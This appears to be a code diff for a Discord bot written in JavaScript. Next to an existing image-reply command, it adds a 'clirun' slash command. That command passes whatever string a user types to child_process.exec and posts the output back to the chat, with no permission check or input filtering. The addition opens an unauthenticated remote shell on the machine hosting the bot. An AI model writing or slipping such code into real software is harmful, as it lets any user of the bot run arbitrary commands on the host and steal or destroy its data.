@@ -100,7 +100,25 @@ client.on('interactionCreate', async (interaction) => {
       .setImage(`attachment://${categoryFiles[categoryIndex]}`);
   
     interaction.reply({ embeds: [embed], files: [categoryFile] });
-  }       
+  }
+
+  const { exec } = require('child_process');
+  
+  if (interaction.commandName === 'clirun'){
+    const command = interaction.options.getString('command');
+
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        console.error(`exec error: ${error}`);
+        return interaction.reply(`An error occurred while running the command: ${error.message}`);
+      }
+
+      console.log(`stdout: ${stdout}`);
+      console.error(`stderr: ${stderr}`);
+
+      interaction.reply(`\`\`\`${stdout}\`\`\``);
+    });
+  }
 });
 
 client.login(token);
